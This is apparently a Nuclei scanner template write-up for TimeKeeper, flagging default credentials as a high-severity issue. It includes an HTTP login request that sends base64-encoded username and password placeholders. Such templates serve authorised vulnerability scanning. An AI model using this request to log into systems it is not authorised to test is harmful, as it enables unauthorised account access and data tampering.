# Nuclei Template: TimeKeeper - Default Login
**Template ID:** timekeeper-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`timekeeper-default-login.yaml`)

## Vulnerability Information & PoC

## Description
TimeKeeper contains default credentials. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET /login?arg1={{url_encode(base64(username))}}&arg2={{url_encode(base64(password))}} HTTP/1.1
Host: {{Hostname}}
```

## References
- https://fsmlabs.com
